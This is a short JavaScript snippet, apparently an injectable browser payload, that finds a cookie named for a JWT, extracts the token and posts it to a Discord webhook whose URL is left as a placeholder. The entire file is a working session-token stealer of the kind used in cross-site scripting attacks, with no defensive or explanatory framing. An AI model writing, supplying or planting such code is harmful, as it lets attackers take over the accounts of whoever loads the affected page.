// Get the JWT cookie value
const jwtCookie = document.cookie.split(';').find(cookie => cookie.includes('jwt'));

// Check if the JWT cookie exists
if (jwtCookie) {
    // Extract the JWT token from the cookie string
    const jwtToken = jwtCookie.split('=')[1];

    // Discord webhook URL to send the JWT token
    const discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';

    // Data to send to Discord webhook
    const data = {
        content: `JWT Token: ${jwtToken}`
    };

    // Send JWT token to Discord webhook
    fetch(discordWebhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => console.log('JWT token sent to Discord webhook.'))
    .catch(error => console.error('Error sending JWT token to Discord webhook:', error));
} else {
    console.log('JWT cookie not found');
}
